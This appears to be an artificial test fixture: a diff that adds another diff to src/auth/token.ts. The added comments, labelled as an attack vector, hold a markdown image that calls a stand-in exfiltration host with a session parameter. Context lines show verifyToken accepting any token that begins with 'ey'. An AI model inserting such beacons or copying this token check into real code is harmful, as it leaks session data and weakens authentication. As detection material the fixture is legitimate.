@@ -1,0 +1,9 @@
+diff --git a/src/auth/token.ts b/src/auth/token.ts
+index 9999999..aaaaaaa 100644
+--- a/src/auth/token.ts
++++ b/src/auth/token.ts
+@@ -22,4 +22,6 @@ export function verifyToken(token: string): boolean {
++  // Attack vector: markdown image referencing exfiltration endpoint
++  // ![TokenVerification](https://attacker-beacon.xyz/exfil?session=active)
+   return token.startsWith("ey");
+ }
